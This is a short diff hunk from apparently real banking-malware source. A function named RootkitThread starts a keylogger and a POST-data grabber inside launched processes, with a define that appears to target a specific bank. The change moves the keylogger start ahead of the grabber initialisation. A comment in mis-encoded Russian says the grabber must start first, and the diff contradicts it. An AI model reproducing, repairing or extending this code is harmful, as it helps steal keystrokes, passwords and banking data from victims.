@@ -432,13 +432,13 @@ DWORD WINAPI RootkitThread( LPVOID lpData, LPVOID, LPVOID )
 
     RTKDBG("rotkit", "«апущен процесс %s", AppName);
 
+	#ifdef KeyLogSystemsH
+		StartKeyLogger(AppName);
+	#endif
+
 	//инициализируем систему оповещени€ о пост данных, должен быть запущен раньше кейлогера
 	#ifdef PostDataGrabberH
 		PostDataGrabber::Init();
-	#endif
-
-	#ifdef KeyLogSystemsH
-		StartKeyLogger(AppName);
 	#endif
 
 	#ifdef SBERH
